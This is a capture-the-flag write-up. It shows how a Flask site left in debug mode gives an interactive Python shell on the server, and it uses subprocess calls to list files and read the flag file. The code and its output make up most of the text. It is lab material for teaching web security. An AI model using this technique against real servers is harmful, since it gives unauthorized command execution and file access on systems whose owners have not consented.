In this challenge, we are given a site hosted using flask. If we analyse the code used for hosting the site, we can see that debug mode is set True.

This means, we can run an interactive python shell in the server.

So, we can essentially open a subprocess and run bash commands to check the files present in the server.

```
import subprocess

out = subprocess.Popen(['ls'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
stdout,stderr = out.communicate()

print(stdout)
```

This results in the following:

```#b'Dockerfile\ndocker-compose.yml\nman_this_sure_is_an_odd_name_for_a_flag_file\nserver.py\n'```

So we got the list of files present in the server. 

Now we can cat the flag file to get the flag.

```
out = subprocess.Popen(['cat', 'man_this_sure_is_an_odd_name_for_a_flag_file'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
stdout, stderr = out.communicate()

print(stdout)
```

The flag is ```b'ictf{oops_I_left_my_debugger_on_I_need_to_run_home_before_my_webserver_burns_down}'```